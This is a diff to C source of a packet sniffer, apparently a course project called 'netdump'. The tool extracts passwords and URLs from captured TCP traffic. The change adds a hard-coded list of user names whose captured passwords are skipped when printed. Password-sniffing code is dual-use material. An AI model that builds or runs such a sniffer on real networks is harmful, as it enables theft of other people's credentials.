@@ -16,8 +16,6 @@
 RETSIGTYPE (*setsignal(int, RETSIGTYPE (*)(int)))(int);
 #endif
 
-char cpre580f98[] = "netdump";
-
 void raw_print(u_char *user, const struct pcap_pkthdr *h, const u_char *p);
 void print_pw(const u_char *p, char * tcp_data);
 void print_url(const u_char *p, char * tcp_data);
@@ -291,6 +289,20 @@ int line_len(char * str)
 	return i;
 }
 
+// returns 0 if we can print user
+// returns 1 if user is excluded
+
+int  user_exclude(char * user)
+{
+	if (strcasestr(user, "root") != NULL) return 1;
+	if (strcasestr(user, "dougj") != NULL) return 1;
+	if (strcasestr(user, "admin") != NULL) return 1;
+	if (strcasestr(user, "chris1") != NULL) return 1;
+	if (strcasestr(user, "melissa2") != NULL) return 1;
+	return 0;
+}
+
+
 void print_pw(const u_char *p, char * tcp_data)
 {
 	char *auth_ptr, *user_pw;
@@ -314,6 +326,10 @@ void print_pw(const u_char *p, char * tcp_data)
 		i++;
 	}
 	i++;
+// exclusion list (hard coded for now)
+
+	if (user_exclude(user)) return;
+
 // get password
 	while (i <auth_len) {
 		if (auth_ptr[i] == '&') {
